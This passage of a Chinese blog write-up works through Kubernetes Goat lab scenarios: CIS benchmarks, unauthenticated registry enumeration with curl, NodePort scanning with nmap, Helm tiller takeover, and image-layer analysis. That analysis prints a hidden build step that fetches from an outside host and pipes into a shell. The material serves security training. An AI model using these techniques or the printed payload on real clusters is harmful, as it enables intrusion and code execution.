privileged: true</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 8080</span><br><span class="line">        volumeMounts:</span><br><span class="line">        - name: host-filesystem</span><br><span class="line">          mountPath: /host-system</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<h1 id="Docker-CIS-基准分析"><a href="#Docker-CIS-基准分析" class="headerlink" title="Docker CIS 基准分析"></a>Docker CIS 基准分析</h1><p>CIS即Center for Internet Security (CIS) 为安全基准计划提供了定义明确、公正、基于一致性的行业最佳实践来帮助组织评估和增强其安全性</p>
+<p>Docker Bench for Security是一款脚本工具，用于检查围绕在生产环境中部署Docker容器的数十种常见最佳实践。github地址：<a href="https://github.com/docker/docker-bench-security" target="_blank" rel="noopener">https://github.com/docker/docker-bench-security</a></p>
+<p>首先部署 Docker CIS 基准测试的容器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f scenarios/docker-bench-security/deployment.yaml</span><br></pre></td></tr></table></figure>
+
+<p>进入容器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl exec -it docker-bench-security-XXXXX -- sh</span><br></pre></td></tr></table></figure>
+
+<p>执行<code>~/docker-bench-security</code>中的docker-bench-security.sh即可执行检查</p>
+<p>其实上面的<code>scenarios/docker-bench-security/deployment.yaml</code>是将一些宿主机目录映射到容器中，从而执行的检查。</p>
+<p>所以我们也可以直接从github下载脚本到宿主机进行检查</p>
+<h1 id="Kubernetes-CIS-基准分析"><a href="#Kubernetes-CIS-基准分析" class="headerlink" title="Kubernetes CIS 基准分析"></a>Kubernetes CIS 基准分析</h1><p>上面是docker，这次是Kubernetes，github地址：<a href="https://github.com/aquasecurity/kube-bench" target="_blank" rel="noopener">https://github.com/aquasecurity/kube-bench</a></p>
+<p>两个命令部署即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f scenarios/kube-bench-security/node-job.yaml</span><br><span class="line"></span><br><span class="line">kubectl apply -f scenarios/kube-bench-security/master-job.yaml</span><br></pre></td></tr></table></figure>
+
+<p>查看yaml，两个执行的命令分别是<code>command: [&quot;kube-bench&quot;, &quot;node&quot;]</code>和<code>command: [&quot;kube-bench&quot;, &quot;master&quot;]</code></p>
+<p>不过我看github上的yaml的command已经有所改变</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># https://github.com/aquasecurity/kube-bench/blob/main/job-master.yaml</span><br><span class="line">command: [&quot;kube-bench&quot;, &quot;run&quot;, &quot;--targets&quot;, &quot;master&quot;]</span><br><span class="line"># https://github.com/aquasecurity/kube-bench/blob/main/job-node.yaml</span><br><span class="line">command: [&quot;kube-bench&quot;, &quot;run&quot;, &quot;--targets&quot;, &quot;node&quot;]</span><br></pre></td></tr></table></figure>
+
+<p>执行后可以看到jobs多了一个<code>kube-bench-node</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@k8s-master:~/kubernetes-goat# kubectl apply -f scenarios/kube-bench-security/node-job.yaml</span><br><span class="line">job.batch/kube-bench-node created</span><br><span class="line">root@k8s-master:~/kubernetes-goat# kubectl get jobs</span><br><span class="line">NAME               COMPLETIONS   DURATION   AGE</span><br><span class="line">batch-check-job    1/1           36s        4d6h</span><br><span class="line">hidden-in-layers   0/1           4d6h       4d6h</span><br><span class="line">kube-bench-node    0/1           14s        14s</span><br></pre></td></tr></table></figure>
+
+<p>不过通过查看pod的状态是Error</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@k8s-master:~/kubernetes-goat# kubectl get pods</span><br><span class="line">NAME                                               READY   STATUS      RESTARTS   AGE</span><br><span class="line">batch-check-job-mrd2q                              0/1     Completed   0          4d6h</span><br><span class="line">build-code-deployment-99d5f65db-hxllz              1/1     Running     0          4d6h</span><br><span class="line">docker-bench-security-dvlgz                        1/1     Running     0          61m</span><br><span class="line">health-check-deployment-66c59d7f6f-qf5b7           1/1     Running     0          4d6h</span><br><span class="line">hidden-in-layers-lbwbn                             1/1     Running     0          4d6h</span><br><span class="line">internal-proxy-deployment-5d99cbbdf7-wqmgr         2/2     Running     0          4d1h</span><br><span class="line">kube-bench-node-44mxv                              0/1     Error       0          12m</span><br><span class="line">kube-bench-node-8vf74                              0/1     Error       0          10m</span><br><span class="line">kube-bench-node-lfnmt                              0/1     Error       0          8m10s</span><br><span class="line">kube-bench-node-nmfn8                              0/1     Error       0          10m</span><br><span class="line">kube-bench-node-t67b8                              0/1     Error       0          11m</span><br><span class="line">kube-bench-node-xnlvw                              0/1     Error       0          5m30s</span><br><span class="line">kube-bench-node-zb54v                              0/1     Error       0          9m30s</span><br><span class="line">kubernetes-goat-home-deployment-757f96b7cd-tq5zh   1/1     Running     0          4d6h</span><br><span class="line">metadata-db-77987b74b-2tqjr                        1/1     Running     0          4d6h</span><br><span class="line">poor-registry-deployment-6746b95974-j9xrw          1/1     Running     0          4d6h</span><br><span class="line">system-monitor-deployment-594c89b48f-97rs9         1/1     Running     0          4d6h</span><br></pre></td></tr></table></figure>
+
+<p>后面修改command后再试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@k8s-master:~/kubernetes-goat# kubectl delete -f ./scenarios/kube-bench-security/node-job.yaml </span><br><span class="line">job.batch &quot;kube-bench-node&quot; deleted</span><br><span class="line">root@k8s-master:~/kubernetes-goat# kubectl apply -f ./scenarios/kube-bench-security/node-job.yaml </span><br><span class="line">job.batch/kube-bench-node created</span><br></pre></td></tr></table></figure>
+
+<p>便可以了，所以还是得用最新的配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@k8s-master:~/kubernetes-goat# kubectl get pods</span><br><span class="line">NAME                                               READY   STATUS      RESTARTS   AGE</span><br><span class="line">batch-check-job-mrd2q                              0/1     Completed   0          4d6h</span><br><span class="line">build-code-deployment-99d5f65db-hxllz              1/1     Running     0          4d6h</span><br><span class="line">docker-bench-security-dvlgz                        1/1     Running     0          63m</span><br><span class="line">health-check-deployment-66c59d7f6f-qf5b7           1/1     Running     0          4d6h</span><br><span class="line">hidden-in-layers-lbwbn                             1/1     Running     0          4d6h</span><br><span class="line">internal-proxy-deployment-5d99cbbdf7-wqmgr         2/2     Running     0          4d1h</span><br><span class="line">kube-bench-node-8xndd                              0/1     Completed   0          68s</span><br><span class="line">kubernetes-goat-home-deployment-757f96b7cd-tq5zh   1/1     Running     0          4d6h</span><br><span class="line">metadata-db-77987b74b-2tqjr                        1/1     Running     0          4d6h</span><br><span class="line">poor-registry-deployment-6746b95974-j9xrw          1/1     Running     0          4d6h</span><br><span class="line">system-monitor-deployment-594c89b48f-97rs9         1/1     Running     0          4d6h</span><br></pre></td></tr></table></figure>
+
+<p>可以通过logs查看审计的log</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl logs -f kube-bench-XXX-xxxxx</span><br></pre></td></tr></table></figure>
+
+<h1 id="攻击私有仓库-Attacking-private-registry"><a href="#攻击私有仓库-Attacking-private-registry" class="headerlink" title="攻击私有仓库(Attacking private registry)"></a>攻击私有仓库(Attacking private registry)</h1><p>通过访问<code>/v2/_catalog</code>可以获取所有repositories</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://192.168.2.174:1235/v2/_catalog</span><br><span class="line">&#123;&quot;repositories&quot;:[&quot;madhuakula/k8s-goat-alpine&quot;,&quot;madhuakula/k8s-goat-users-repo&quot;]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>获取第二个镜像的信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://192.168.2.174:1235/v2/madhuakula/k8s-goat-users-repo/manifests/latest</span><br><span class="line">&#123;</span><br><span class="line">   &quot;schemaVersion&quot;: 1,</span><br><span class="line">   &quot;name&quot;: &quot;madhuakula/k8s-goat-users-repo&quot;,</span><br><span class="line">   &quot;tag&quot;: &quot;latest&quot;,</span><br><span class="line">   &quot;architecture&quot;: &quot;amd64&quot;,</span><br><span class="line">   &quot;fsLayers&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">         &quot;blobSum&quot;: &quot;sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         &quot;blobSum&quot;: &quot;sha256:536ef5475913f0235984eb7642226a99ff4a91fa474317faa45753e48e631bd0&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>从中有环境变量信息</p>
+<p><img src="http://pic.giantbranch.cn/pic/1655721670803.png" alt></p>
+<h1 id="NodePort暴露服务"><a href="#NodePort暴露服务" class="headerlink" title="NodePort暴露服务"></a>NodePort暴露服务</h1><p>NodePort在集群中的主机节点上为Service提供一个代理端口，以允许从主机网络上对Service进行访问。</p>
+<p>这里是本地搭建的，没有公网ip，所以也就没有外部IP——EXTERNAL-IP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl get nodes -o wide</span><br><span class="line">NAME         STATUS   ROLES                  AGE     VERSION    INTERNAL-IP     EXTERNAL-IP   OS-IMAGE             KERNEL-VERSION     CONTAINER-RUNTIME</span><br><span class="line">k8s-master   Ready    control-plane,master   4d23h   v1.21.13   192.168.2.174   &lt;none&gt;        Ubuntu 20.04.2 LTS   5.4.0-72-generic   docker://20.10.16</span><br><span class="line">nsfocus      Ready    &lt;none&gt;                 4d23h   v1.21.13   192.168.2.172   &lt;none&gt;        Ubuntu 20.04.2 LTS   5.4.0-72-generic   docker://20.10.16</span><br></pre></td></tr></table></figure>
+
+<p>默认情况下，NodePort的端口范围是 30000-32767，使用nmap扫描，这里就以内网ip为例了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -T4 -p 30000-32767 192.168.2.172</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-20 18:57 CST</span><br><span class="line">Nmap scan report for 192.168.2.172</span><br><span class="line">Host is up (0.0055s latency).</span><br><span class="line">Not shown: 2767 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">30003/tcp open  amicon-fpsu-ra</span><br><span class="line">MAC Address: 00:50:56:A2:18:00 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds</span><br></pre></td></tr></table></figure>
+
+<p>可以看到是30003端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://192.168.2.172:30003/</span><br><span class="line">&#123;&quot;info&quot;: &quot;Refer to internal http://metadata-db for more information&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Helm-v2-tiller-to-PwN-the-cluster-已弃用"><a href="#Helm-v2-tiller-to-PwN-the-cluster-已弃用" class="headerlink" title="Helm v2 tiller to PwN the cluster[已弃用]"></a>Helm v2 tiller to PwN the cluster[已弃用]</h1><p>这已经从 Kubernetes Goat 启弃用，但是还可以看一下</p>
+<p>Helm 是 Kubernetes 部署和管理应用程序的包管理器，默认配置和设置是不安全的，如果攻击者可以访问任何一个 pod 并且没有网络安全策略 (NSP)，攻击者可以获得完整的集群访问权限和接管集群管理员权限。</p>
+<p>启动环境</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl run --rm --restart=Never -it --image=madhuakula/k8s-goat-helm-tiller -- bash</span><br></pre></td></tr></table></figure>
+
+<p>默认情况下，helm 版本 2 有一个 tiller 组件，它具有完整的集群管理 RBAC 权限</p>
+<p>这个暂时有点问题，不能实践，就是默认不允许执行<code>kubectl get secrets -n kube-system</code>，通过 helm 和 tiller 服务的帮助下部署pwnchart，它将授予所有默认服务帐户 cluster-admin 访问权限，从而可以执行<code>kubectl get secrets -n kube-system</code></p>
+<h1 id="分析挖矿容器-Analysing-crypto-miner-container"><a href="#分析挖矿容器-Analysing-crypto-miner-container" class="headerlink" title="分析挖矿容器(Analysing crypto miner container)"></a>分析挖矿容器(Analysing crypto miner container)</h1><p>一般我们从 Docker Hub 等公共容器仓库下载镜像，黑客可能通过上传运行挖矿程序的镜像到仓库来让用户帮忙挖矿。</p>
+<p>先查看 Kubernetes 集群中的 jobs</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl get jobs -A</span><br><span class="line">NAMESPACE   NAME               COMPLETIONS   DURATION   AGE</span><br><span class="line">default     batch-check-job    1/1           36s        5d5h</span><br><span class="line">default     hidden-in-layers   0/1           5d5h       5d5h</span><br><span class="line">default     kube-bench-node    1/1           29s        22h</span><br></pre></td></tr></table></figure>
+
+<p>kube-bench-node是之前node的基线检查</p>
+<p>获取job的信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl describe job batch-check-job</span><br><span class="line">Name:           batch-check-job</span><br><span class="line">Namespace:      default</span><br><span class="line">Selector:       controller-uid=2ef52301-70c7-48f1-8df7-9319674f2ca7</span><br><span class="line">Labels:         controller-uid=2ef52301-70c7-48f1-8df7-9319674f2ca7</span><br><span class="line">                job-name=batch-check-job</span><br><span class="line">Annotations:    &lt;none&gt;</span><br><span class="line">Parallelism:    1</span><br><span class="line">Completions:    1</span><br><span class="line">Start Time:     Thu, 16 Jun 2022 10:53:35 +0800</span><br><span class="line">Completed At:   Thu, 16 Jun 2022 10:54:11 +0800</span><br><span class="line">Duration:       36s</span><br><span class="line">Pods Statuses:  0 Running / 1 Succeeded / 0 Failed</span><br><span class="line">Pod Template:</span><br><span class="line">  Labels:  controller-uid=2ef52301-70c7-48f1-8df7-9319674f2ca7</span><br><span class="line">           job-name=batch-check-job</span><br><span class="line">  Containers:</span><br><span class="line">   batch-check:</span><br><span class="line">    Image:        madhuakula/k8s-goat-batch-check</span><br><span class="line">    Port:         &lt;none&gt;</span><br><span class="line">    Host Port:    &lt;none&gt;</span><br><span class="line">    Environment:  &lt;none&gt;</span><br><span class="line">    Mounts:       &lt;none&gt;</span><br><span class="line">  Volumes:        &lt;none&gt;</span><br><span class="line">Events:           &lt;none&gt;</span><br></pre></td></tr></table></figure>
+
+<p>获取job对应的pods</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl get pods --namespace default -l &quot;job-name=batch-check-job&quot;</span><br><span class="line">NAME                    READY   STATUS      RESTARTS   AGE</span><br><span class="line">batch-check-job-mrd2q   0/1     Completed   0          5d5h</span><br></pre></td></tr></table></figure>
+
+<p>以yaml格式输出pod的信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl get pod batch-check-job-mrd2q -o yaml</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  creationTimestamp: &quot;2022-06-16T02:53:35Z&quot;</span><br><span class="line">  generateName: batch-check-job-</span><br><span class="line">  labels:</span><br><span class="line">    controller-uid: 2ef52301-70c7-48f1-8df7-9319674f2ca7</span><br><span class="line">    job-name: batch-check-job</span><br><span class="line">  name: batch-check-job-mrd2q</span><br><span class="line">  namespace: default</span><br><span class="line">  ownerReferences:</span><br><span class="line">  - apiVersion: batch/v1</span><br><span class="line">    blockOwnerDeletion: true</span><br><span class="line">    controller: true</span><br><span class="line">    kind: Job</span><br><span class="line">    name: batch-check-job</span><br><span class="line">    uid: 2ef52301-70c7-48f1-8df7-9319674f2ca7</span><br><span class="line">  resourceVersion: &quot;72916&quot;</span><br><span class="line">  uid: 27657ad4-4fa9-48d0-bdd8-c131137ac3d2</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - image: madhuakula/k8s-goat-batch-check</span><br><span class="line">    imagePullPolicy: Always</span><br><span class="line">    name: batch-check</span><br><span class="line">    resources: &#123;&#125;</span><br><span class="line">    terminationMessagePath: /dev/termination-log</span><br><span class="line">    terminationMessagePolicy: File</span><br><span class="line">    volumeMounts:</span><br><span class="line">    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount</span><br><span class="line">      name: kube-api-access-pdfwk</span><br><span class="line">      readOnly: true</span><br><span class="line">  dnsPolicy: ClusterFirst</span><br><span class="line">  enableServiceLinks: true</span><br><span class="line">  nodeName: nsfocus</span><br><span class="line">  preemptionPolicy: PreemptLowerPriority</span><br><span class="line">  priority: 0</span><br><span class="line">  restartPolicy: Never</span><br><span class="line">  schedulerName: default-scheduler</span><br><span class="line">  securityContext: &#123;&#125;</span><br><span class="line">  serviceAccount: default</span><br><span class="line">  serviceAccountName: default</span><br><span class="line">  terminationGracePeriodSeconds: 30</span><br><span class="line">  tolerations:</span><br><span class="line">  - effect: NoExecute</span><br><span class="line">    key: node.kubernetes.io/not-ready</span><br><span class="line">    operator: Exists</span><br><span class="line">    tolerationSeconds: 300</span><br><span class="line">  - effect: NoExecute</span><br><span class="line">    key: node.kubernetes.io/unreachable</span><br><span class="line">    operator: Exists</span><br><span class="line">    tolerationSeconds: 300</span><br><span class="line">  volumes:</span><br><span class="line">  - name: kube-api-access-pdfwk</span><br><span class="line">    projected:</span><br><span class="line">      defaultMode: 420</span><br><span class="line">      sources:</span><br><span class="line">      - serviceAccountToken:</span><br><span class="line">          expirationSeconds: 3607</span><br><span class="line">          path: token</span><br><span class="line">      - configMap:</span><br><span class="line">          items:</span><br><span class="line">          - key: ca.crt</span><br><span class="line">            path: ca.crt</span><br><span class="line">          name: kube-root-ca.crt</span><br><span class="line">      - downwardAPI:</span><br><span class="line">          items:</span><br><span class="line">          - fieldRef:</span><br><span class="line">              apiVersion: v1</span><br><span class="line">              fieldPath: metadata.namespace</span><br><span class="line">            path: namespace</span><br><span class="line">status:</span><br><span class="line">  conditions:</span><br><span class="line">  - lastProbeTime: null</span><br><span class="line">    lastTransitionTime: &quot;2022-06-16T02:53:35Z&quot;</span><br><span class="line">    reason: PodCompleted</span><br><span class="line">    status: &quot;True&quot;</span><br><span class="line">    type: Initialized</span><br><span class="line">  - lastProbeTime: null</span><br><span class="line">    lastTransitionTime: &quot;2022-06-16T02:53:35Z&quot;</span><br><span class="line">    reason: PodCompleted</span><br><span class="line">    status: &quot;False&quot;</span><br><span class="line">    type: Ready</span><br><span class="line">  - lastProbeTime: null</span><br><span class="line">    lastTransitionTime: &quot;2022-06-16T02:53:35Z&quot;</span><br><span class="line">    reason: PodCompleted</span><br><span class="line">    status: &quot;False&quot;</span><br><span class="line">    type: ContainersReady</span><br><span class="line">  - lastProbeTime: null</span><br><span class="line">    lastTransitionTime: &quot;2022-06-16T02:53:35Z&quot;</span><br><span class="line">    status: &quot;True&quot;</span><br><span class="line">    type: PodScheduled</span><br><span class="line">  containerStatuses:</span><br><span class="line">  - containerID: docker://3c724beda2e350f66c3e1845535a2b62f03f3678070ac6d290c39ee7462feb1f</span><br><span class="line">    image: madhuakula/k8s-goat-batch-check:latest</span><br><span class="line">    imageID: docker-pullable://madhuakula/k8s-goat-batch-check@sha256:5be381d47c086a0b74bbcdefa5f3ba0ebb78c8acbd2c07005346b5ff687658ef</span><br><span class="line">    lastState: &#123;&#125;</span><br><span class="line">    name: batch-check</span><br><span class="line">    ready: false</span><br><span class="line">    restartCount: 0</span><br><span class="line">    started: false</span><br><span class="line">    state:</span><br><span class="line">      terminated:</span><br><span class="line">        containerID: docker://3c724beda2e350f66c3e1845535a2b62f03f3678070ac6d290c39ee7462feb1f</span><br><span class="line">        exitCode: 0</span><br><span class="line">        finishedAt: &quot;2022-06-16T02:54:11Z&quot;</span><br><span class="line">        reason: Completed</span><br><span class="line">        startedAt: &quot;2022-06-16T02:54:11Z&quot;</span><br><span class="line">  hostIP: 192.168.2.172</span><br><span class="line">  phase: Succeeded</span><br><span class="line">  podIP: 10.244.1.4</span><br><span class="line">  podIPs:</span><br><span class="line">  - ip: 10.244.1.4</span><br><span class="line">  qosClass: BestEffort</span><br><span class="line">  startTime: &quot;2022-06-16T02:53:35Z&quot;</span><br></pre></td></tr></table></figure>
+
+<p>batch-check-job使用的是<code>madhuakula/k8s-goat-batch-check</code>镜像</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl get pod batch-check-job-mrd2q -o yaml | grep image</span><br><span class="line">  - image: madhuakula/k8s-goat-batch-check</span><br><span class="line">    imagePullPolicy: Always</span><br><span class="line">    image: madhuakula/k8s-goat-batch-check:latest</span><br><span class="line">    imageID: docker-pullable://madhuakula/k8s-goat-batch-check@sha256:5be381d47c086a0b74bbcdefa5f3ba0ebb78c8acbd2c07005346b5ff687658ef</span><br></pre></td></tr></table></figure>
+
+<p>我们可以通过<code>docker history</code>查看image每一层所执行的命令，<code>--no-trunc</code>是不要截断输出<br>(下面这个需要在node执行，因为只有在node有这个镜像)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ docker history --no-trunc madhuakula/k8s-goat-batch-check</span><br><span class="line">IMAGE                                                                     CREATED        CREATED BY                                                                                                                                                                                                                                                                                 SIZE      COMMENT</span><br><span class="line">sha256:cb43bcb572b74468336c6854282c538e9ac7f2efc294aa3e49ce34fab7a275c7   5 weeks ago    CMD [&quot;ps&quot; &quot;auxx&quot;]                                                                                                                                                                                                                                                                          0B        buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;                                                                 5 weeks ago    RUN /bin/sh -c apk add --no-cache htop curl ca-certificates    &amp;&amp; echo &quot;curl -sSL https://madhuakula.com/kubernetes-goat/k8s-goat-a5e0a28fa75bf429123943abedb065d1 &amp;&amp; echo &apos;id&apos; | sh &quot; &gt; /usr/bin/system-startup     &amp;&amp; chmod +x /usr/bin/system-startup     &amp;&amp; rm -rf /tmp/* # buildkit   2.96MB    buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;                                                                 5 weeks ago    LABEL MAINTAINER=Madhu Akula INFO=Kubernetes Goat                                                                                                                                                                                                                                          0B        buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;                                                                 2 months ago   /bin/sh -c #(nop)  CMD [&quot;/bin/sh&quot;]                                                                                                                                                                                                                                                         0B        </span><br><span class="line">&lt;missing&gt;                                                                 2 months ago   /bin/sh -c #(nop) ADD file:5d673d25da3a14ce1f6cf66e4c7fd4f4b85a3759a9d93efb3fd9ff852b5b56e4 in /                                                                                                                                                                                           5.57MB</span><br></pre></td></tr></table></figure>
+
+<p>可以看到执行了这个可疑的命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh -c apk add --no-cache htop curl ca-certificates    &amp;&amp; echo &quot;curl -sSL https://madhuakula.com/kubernetes-goat/k8s-goat-a5e0a28fa75bf429123943abedb065d1 &amp;&amp; echo &apos;id&apos; | sh &quot; &gt; /usr/bin/system-startup     &amp;&amp; chmod +x /usr/bin/system-startup     &amp;&amp; rm -rf /tmp/*</span><br></pre></td></tr></table></figure>
+
+<h1 id="Kubernetes-命名空间绕过-Kubernetes-namespaces-bypass"><a href="#Kubernetes-命名空间绕过-Kubernetes-namespaces-bypass" class="headerlink" title="Kubernetes 命名空间绕过(Kubernetes namespaces bypass)"></a>Kubernetes 命名空间绕过(Kubernetes namespaces bypass)</h1><p> Kubernetes 中有不同的命名空间并且资源被部署和管理时，它们是安全的并且无法相互访问。</p>
+<p> 默认情况下，Kubernetes 使用平面网络架构，这意味着集群中的任何 pod/服务都可以与其他人通信。</p>
+<p> 默认情况下，集群内的命名空间没有任何网络安全限制。命名空间中的任何人都可以与其他命名空间通信。</p>
